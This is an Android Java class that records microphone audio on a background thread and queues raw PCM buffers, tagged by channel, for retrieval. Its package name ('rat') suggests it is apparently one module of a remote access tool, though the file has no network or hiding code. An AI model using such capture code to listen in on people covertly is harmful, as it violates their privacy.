package Libreria;

import android.app.Activity;
import android.content.Context;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.AudioRecord.OnRecordPositionUpdateListener;
import android.media.MediaRecorder;
import android.os.Bundle;
import android.os.Environment;
import android.util.Log;

import java.io.IOException;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.LinkedBlockingQueue;

import rat.rata2.R;

/**
 * Created by Vero on 06/05/2015.
 */
public class Audio extends Activity {
    private static final String TAG = "Audio";
  //  String outputFile = null;
  //  MediaRecorder recorder;
    public BlockingQueue<byte[]> bbq = new LinkedBlockingQueue<byte[]>();
    int channelConfiguration = AudioFormat.CHANNEL_IN_MONO;
    int audioEncoding = AudioFormat.ENCODING_PCM_16BIT;
    int frecuencia = 22050; //http://wiki.audacityteam.org/wiki/Sample_Rates

    int bufferSizeRecorder;
    byte[] buffer;
    AudioRecord audioRecord;
    Thread threcord;
    Context ctx;
    int chan;
    boolean stop;

    public Audio(OnRecordPositionUpdateListener c, int source, int chan) {
        this.chan = chan ;
        bufferSizeRecorder = AudioRecord.getMinBufferSize(frecuencia, channelConfiguration, audioEncoding);
        audioRecord = new AudioRecord(source, frecuencia, channelConfiguration, audioEncoding, bufferSizeRecorder);

        audioRecord.setPositionNotificationPeriod(512);
        audioRecord.setRecordPositionUpdateListener(c);

        threcord = new Thread(
                new Runnable() {
                    public void run() {
                        record();
                    }
                });


    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
  //      recorder = new MediaRecorder();
  //      outputFile = Environment.getExternalStorageDirectory().getAbsolutePath() + "/grabAudio.3gp";
  //      recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
  //      recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
  //      recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
  //      recorder.setOutputFile(outputFile);
    }
  //  public void start(){
  //      try {
  //         recorder.prepare();
  //          recorder.start();
  //      } catch (IOException e) {
  //          e.printStackTrace();
  //      }
  //  }
    public void stop(){
       // recorder.stop();
       // recorder.release();
        stop = true;
    }
    public byte[] getData() {
        try {
            if(!bbq.isEmpty()) {
                return bbq.take();
            }
        } catch (InterruptedException e) {
        }
        return null;
    }
    public void record() {
        try {
            if (audioRecord.getState() == AudioRecord.STATE_UNINITIALIZED) {
                Log.e(TAG, "Initialisation failed !");
                audioRecord.release();
                audioRecord = null;
                return;
            }

            buffer = new byte[bufferSizeRecorder];
            audioRecord.startRecording();

            while (!stop) {
                int bufferReadResult = audioRecord.read(buffer, 0, bufferSizeRecorder);
                byte[] tmp = new byte[bufferReadResult];
                System.arraycopy(buffer, 0, tmp, 0, bufferReadResult);
                bbq.add(tmp);

            }

            audioRecord.stop();

        } catch (Throwable t) {
            Log.e("AudioRecord", "Recording Failed");
        }

    }
    public void run() {
        Log.i(TAG, "Launch record thread");
        stop = false;
        threcord.start();
    }
    public int getChannel(){
        return chan;
    }

}
